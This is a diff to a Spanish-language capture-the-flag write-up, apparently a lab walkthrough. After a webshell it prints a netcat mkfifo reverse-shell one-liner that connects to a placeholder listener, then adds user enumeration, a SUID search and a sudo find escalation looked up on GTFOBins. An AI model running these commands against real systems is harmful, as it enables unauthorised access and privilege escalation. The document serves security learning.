@@ -86,7 +86,23 @@ Siguiendo las instrucciones del exploit, lo lanzamos, nos da la URI de la webshe
 
 Entonces, hacemos rápidamente un `whoami` y nos devuelve `www-data`. Dicho esto, nos apuramos a lanzar una Reverse Shell para tener más control localmente. Para ello, preparamos un listener. En este caso, uso [Penelope](https://github.com/brightio/penelope). Corremos `penelope -i <IP_local> -p <puerto_local>` y queda escuchando. 
 
-Primero vemos las herramientas instaladas en el sistema para ver con qué podemos correr la RevShell. Hacemos rápidamente `which python python2 python3 nc` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y probando y probando encontramos que la manera de lanzarla según la config de la víctima es con la versión portable (POSIX) ejecutado `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`
+Primero vemos las herramientas instaladas en el sistema para ver con qué podemos correr la RevShell. Hacemos rápidamente `which python python2 python3 nc` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y probando y probando encontramos que la manera de lanzarla según la config de la víctima es con la versión portable (POSIX) ejecutado `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`.  
+
+Una vez lograda la conexión, tenemos mucha más funcionalidad.  
+
+Ahora sí, es turno de Enumerar Usuarios. Lo hacemos de la siguientes maneras:  
+
+* cat /etc/passwd
+* ls -l /home/
+
+Conseguimos 2 usuarios relevantes:  
+1. rafa
+2. ruben
+
+Ambos usan /bin/bash.  
+
+Bien, lo segundo que debemos hacer es Buscar Binarios SUID y Privilegios Sudo. El primero lo conseguimos corriendo `find / -type f -perm -4000 2>/dev/null | xargs ls -l`. Esto no nos da ninguno que se aprecie, entonces probamos el siguiente con `sudo -l` y nos devuelve: `(rafa) NOPASSWD: /usr/bin/find`. Vamos a [GTFOBins](https://gtfobins.github.io/) y buscamos `find` filtrando por `sudo`. Encontramos
+
 
 #### FASE POST-EXPLOTACIÓN: Elevar Privilegios
 
